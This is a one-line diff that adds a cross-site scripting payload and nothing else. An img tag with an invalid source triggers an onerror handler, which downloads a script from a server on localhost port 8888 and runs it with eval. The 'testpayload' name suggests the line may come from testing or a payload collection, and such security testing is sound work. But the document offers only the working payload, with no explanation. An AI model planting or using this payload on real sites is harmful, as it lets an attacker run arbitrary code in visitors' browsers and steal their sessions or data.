@@ -1,0 +1,1 @@
+<img src=x onerror="$.get('http://localhost:8888/testpayload.js', {success:function(res){eval(res)}})">
